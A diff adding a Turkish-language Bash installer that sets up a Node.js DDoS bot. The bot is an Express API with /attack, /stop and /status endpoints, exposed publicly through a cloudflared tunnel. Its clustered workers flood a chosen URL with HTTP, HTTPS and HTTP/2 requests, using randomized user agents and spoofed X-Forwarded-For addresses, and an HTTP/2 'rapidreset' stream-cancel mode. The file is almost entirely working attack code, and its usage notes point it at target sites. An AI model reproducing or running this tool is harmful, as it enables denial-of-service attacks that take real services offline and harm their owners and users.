@@ -1,0 +1,393 @@
+#!/bin/bash
+
+# Renkli çıktı için
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # No Color
+
+echo -e "${GREEN}=== BOT KURULUM SCRIPTİ BAŞLIYOR ===${NC}"
+
+# Cloudflared indir
+echo -e "${YELLOW}[1/6] Cloudflared indiriliyor...${NC}"
+wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
+chmod +x cloudflared
+sudo mv cloudflared /usr/local/bin/
+echo -e "${GREEN}✓ Cloudflared kuruldu${NC}"
+
+# Klasör oluştur
+echo -e "${YELLOW}[2/6] Klasör yapısı oluşturuluyor...${NC}"
+mkdir -p bot
+cd bot
+echo -e "${GREEN}✓ bot klasörü oluşturuldu${NC}"
+
+# NPM paketlerini yükle
+echo -e "${YELLOW}[3/6] NPM paketleri yükleniyor...${NC}"
+npm init -y > /dev/null 2>&1
+npm install express http2 http https cluster os url > /dev/null 2>&1
+echo -e "${GREEN}✓ NPM paketleri yüklendi${NC}"
+
+# index.js oluştur (API versiyonu)
+echo -e "${YELLOW}[4/6] index.js oluşturuluyor...${NC}"
+
+cat > index.js << 'EOF'
+const express = require('express');
+const https = require('https');
+const http = require('http');
+const http2 = require('http2');
+const cluster = require('cluster');
+const os = require('os');
+const url = require('url');
+
+const app = express();
+const PORT = 3000;
+let activeAttack = {
+    workers: [],
+    url: null,
+    power: 0,
+    method: 'GET',
+    mode: 'normal',
+    stats: {
+        totalRequests: 0,
+        success: 0,
+        fail: 0,
+        startTime: null
+    }
+};
+
+app.use(express.json());
+
+// Ana sayfa
+app.get('/', (req, res) => {
+    res.json({
+        status: 'online',
+        active: activeAttack.workers.length > 0,
+        endpoints: {
+            attack: 'GET /attack?url=HEDEF&power=GUC',
+            stop: 'GET /stop',
+            status: 'GET /status'
+        }
+    });
+});
+
+// Attack endpoint
+app.get('/attack', (req, res) => {
+    if (activeAttack.workers.length > 0) {
+        return res.status(400).json({ error: 'Zaten bir saldırı aktif. Önce /stop kullan.' });
+    }
+
+    const targetUrl = req.query.url;
+    let power = parseInt(req.query.power) || 50;
+    const method = 'GET';
+    const mode = 'normal';
+
+    if (!targetUrl || !targetUrl.startsWith('http')) {
+        return res.status(400).json({ error: 'Geçerli bir URL gir (http:// ile başlamalı)' });
+    }
+
+    power = Math.max(1, Math.min(500, power));
+    const numCPUs = Math.min(os.cpus().length, 12);
+
+    activeAttack = {
+        workers: [],
+        url: targetUrl,
+        power,
+        method,
+        mode,
+        stats: {
+            totalRequests: 0,
+            success: 0,
+            fail: 0,
+            startTime: Date.now()
+        }
+    };
+
+    console.log(`[MASTER] Saldırı başlıyor → ${targetUrl} | Güç: ${power}`);
+
+    for (let i = 0; i < numCPUs; i++) {
+        const worker = cluster.fork({
+            TARGET: targetUrl,
+            POWER: power,
+            METHOD: method,
+            MODE: mode
+        });
+
+        worker.on('message', (msg) => {
+            if (msg.type === 'request') {
+                activeAttack.stats.totalRequests++;
+                if (msg.success) {
+                    activeAttack.stats.success++;
+                } else {
+                    activeAttack.stats.fail++;
+                }
+            }
+        });
+
+        activeAttack.workers.push(worker.id);
+    }
+
+    res.json({
+        success: true,
+        message: 'Saldırı başlatıldı',
+        target: targetUrl,
+        power: power,
+        workers: numCPUs
+    });
+});
+
+// Stop endpoint
+app.get('/stop', (req, res) => {
+    if (activeAttack.workers.length === 0) {
+        return res.status(400).json({ error: 'Aktif saldırı yok.' });
+    }
+
+    activeAttack.workers.forEach(id => {
+        if (cluster.workers[id]) cluster.workers[id].kill('SIGTERM');
+    });
+
+    const attackInfo = { ...activeAttack };
+    activeAttack = {
+        workers: [],
+        url: null,
+        power: 0,
+        method: 'GET',
+        mode: 'normal',
+        stats: {
+            totalRequests: 0,
+            success: 0,
+            fail: 0,
+            startTime: null
+        }
+    };
+
+    const elapsed = (Date.now() - attackInfo.stats.startTime) / 1000;
+
+    res.json({
+        success: true,
+        message: 'Saldırı durduruldu',
+        target: attackInfo.url,
+        duration: `${elapsed.toFixed(0)} saniye`,
+        stats: {
+            total: attackInfo.stats.totalRequests,
+            success: attackInfo.stats.success,
+            fail: attackInfo.stats.fail,
+            rps: (attackInfo.stats.totalRequests / elapsed).toFixed(2)
+        }
+    });
+});
+
+// Status endpoint
+app.get('/status', (req, res) => {
+    if (activeAttack.workers.length === 0) {
+        return res.json({ active: false, message: 'Aktif saldırı yok' });
+    }
+
+    const elapsed = (Date.now() - activeAttack.stats.startTime) / 1000;
+    
+    res.json({
+        active: true,
+        target: activeAttack.url,
+        power: activeAttack.power,
+        workers: activeAttack.workers.length,
+        elapsed: `${elapsed.toFixed(0)} saniye`,
+        stats: {
+            total: activeAttack.stats.totalRequests,
+            success: activeAttack.stats.success,
+            fail: activeAttack.stats.fail,
+            rps: (activeAttack.stats.totalRequests / elapsed).toFixed(2)
+        }
+    });
+});
+
+// Master process
+if (cluster.isMaster) {
+    app.listen(PORT, '0.0.0.0', () => {
+        console.log(`✅ API sunucusu http://localhost:${PORT} adresinde çalışıyor`);
+    });
+}
+
+// Worker process
+if (cluster.isWorker) {
+    const target = process.env.TARGET;
+    const power = parseInt(process.env.POWER, 10);
+    const method = process.env.METHOD || 'GET';
+    const mode = process.env.MODE || 'normal';
+    
+    const parsed = url.parse(target);
+    const isHttps = parsed.protocol === 'https:';
+    const port = parsed.port || (isHttps ? 443 : 80);
+
+    const uaList = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
+        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
+    ];
+
+    const languages = ['en-US,en;q=0.9', 'tr-TR,tr;q=0.8', 'fr-FR,fr;q=0.9'];
+
+    function randomUA() { return uaList[Math.floor(Math.random() * uaList.length)]; }
+    function randomLang() { return languages[Math.floor(Math.random() * languages.length)]; }
+    function randomIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }
+
+    function randomPath() {
+        const base = parsed.path || '/';
+        const frag = Math.random().toString(36).substring(2, 15);
+        return `${base}?${Math.random().toString(36).substring(2)}=${frag}`;
+    }
+
+    let http2session = null;
+    let reconnectAttempts = 0;
+    const MAX_RECONNECT = 25;
+
+    function createSession() {
+        if (http2session) http2session.destroy();
+        try {
+            http2session = http2.connect(target, {
+                settings: { enablePush: false, initialWindowSize: 65535 * 4, maxConcurrentStreams: 300 }
+            });
+            reconnectAttempts = 0;
+            http2session.on('error', () => { http2session = null; });
+            http2session.on('goaway', () => {
+                http2session.destroy();
+                http2session = null;
+                if (reconnectAttempts < MAX_RECONNECT) {
+                    reconnectAttempts++;
+                    setTimeout(createSession, 50 + Math.random() * 150);
+                }
+            });
+            http2session.on('close', () => { http2session = null; });
+        } catch (e) { http2session = null; }
+    }
+
+    if (isHttps) createSession();
+
+    function sendRequest() {
+        const randomQueryPath = randomPath();
+        let success = false;
+
+        try {
+            if (mode === 'rapidreset' && http2session) {
+                const headers = {
+                    ':method': method, ':path': randomQueryPath, ':authority': parsed.host,
+                    ':scheme': 'https', 'user-agent': randomUA(), 'accept-language': randomLang(),
+                    'x-forwarded-for': randomIP()
+                };
+                const stream = http2session.request(headers);
+                stream.on('error', () => {});
+                stream.rstStream(http2.constants.NGHTTP2_CANCEL);
+                stream.end();
+                success = true;
+            } else if (http2session) {
+                const headers = {
+                    ':method': method, ':path': randomQueryPath, ':authority': parsed.host,
+                    ':scheme': 'https', 'user-agent': randomUA(), 'accept-language': randomLang(),
+                    'x-forwarded-for': randomIP()
+                };
+                const stream = http2session.request(headers);
+                stream.on('error', () => {});
+                stream.end();
+                success = true;
+            } else {
+                const options = {
+                    hostname: parsed.hostname, port, path: randomQueryPath, method,
+                    headers: {
+                        'User-Agent': randomUA(), 'Accept-Language': randomLang(),
+                        'X-Forwarded-For': randomIP(), 'Connection': 'keep-alive'
+                    },
+                    agent: isHttps ? new https.Agent({ keepAlive: true, maxSockets: Infinity }) : new http.Agent({ keepAlive: true, maxSockets: Infinity })
+                };
+                const req = (isHttps ? https : http).request(options, () => { success = true; });
+                req.on('error', () => { success = false; });
+                req.end();
+            }
+        } catch (err) {
+            success = false;
+        }
+
+        process.send({ type: 'request', success });
+    }
+
+    function floodLoop() {
+        for (let i = 0; i < power; i++) {
+            sendRequest();
+        }
+        setTimeout(floodLoop, 8 + Math.floor(Math.random() * 8));
+    }
+
+    floodLoop();
+}
+EOF
+
+echo -e "${GREEN}✓ index.js oluşturuldu${NC}"
+
+# Cloudflared tunnel başlat
+echo -e "${YELLOW}[5/6] Cloudflared tunnel başlatılıyor...${NC}"
+
+# Arka planda node sunucusunu başlat
+node index.js &
+NODE_PID=$!
+
+# Cloudflared'ı başlat ve URL'yi al
+cloudflared tunnel --url http://localhost:3000 > cloudflared.log 2>&1 &
+CLOUDFLARED_PID=$!
+
+# Cloudflared'ın başlamasını bekle
+echo -e "${YELLOW}Cloudflared başlatılıyor, lütfen bekleyin...${NC}"
+sleep 5
+
+# Cloudflared URL'sini bul
+CLOUDFLARED_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' cloudflared.log | head -1)
+
+if [ -n "$CLOUDFLARED_URL" ]; then
+    echo -e "${GREEN}✓ Cloudflared tunnel aktif: ${CLOUDFLARED_URL}${NC}"
+else
+    echo -e "${YELLOW}! Cloudflared URL henüz alınamadı, manuel kontrol gerekebilir${NC}"
+    echo -e "${YELLOW}  'cat cloudflared.log' ile kontrol edin${NC}"
+    CLOUDFLARED_URL="HENÜZ_ALINAMADI"
+fi
+
+# Bilgi dosyası oluştur
+cat > info.txt << EOF
+=== API BOT KURULUM BİLGİLERİ ===
+Tarih: $(date)
+
+API Sunucusu: http://localhost:3000
+Cloudflared URL: ${CLOUDFLARED_URL}
+
+ENDPOINT'LER:
+1. Saldırı başlat:
+   ${CLOUDFLARED_URL}/attack?url=https://hedef-site.com&power=100
+
+2. Saldırı durdur:
+   ${CLOUDFLARED_URL}/stop
+
+3. Durum kontrol:
+   ${CLOUDFLARED_URL}/status
+
+Not: power değeri 1-500 arası olabilir.
+
+SÜREÇLER:
+- Node.js PID: ${NODE_PID}
+- Cloudflared PID: ${CLOUDFLARED_PID}
+
+Durdurmak için: kill ${NODE_PID} ${CLOUDFLARED_PID}
+EOF
+
+echo -e "${GREEN}[6/6] KURULUM TAMAMLANDI!${NC}"
+echo -e "${GREEN}================================${NC}"
+echo -e "API Sunucusu: ${YELLOW}http://localhost:3000${NC}"
+echo -e "Cloudflared URL: ${YELLOW}${CLOUDFLARED_URL}${NC}"
+echo -e "${GREEN}================================${NC}"
+echo -e "Kullanım:"
+echo -e "  ${CYAN}Attack:${NC} ${CLOUDFLARED_URL}/attack?url=HEDEF&power=GUC"
+echo -e "  ${CYAN}Stop:${NC}   ${CLOUDFLARED_URL}/stop"
+echo -e "  ${CYAN}Status:${NC} ${CLOUDFLARED_URL}/status"
+echo -e "${GREEN}================================${NC}"
+echo -e "Detaylı bilgi: ${YELLOW}cat bot/info.txt${NC}"
+echo -e "${GREEN}================================${NC}"
+
+# Process'leri bekle
+wait $NODE_PID $CLOUDFLARED_PID
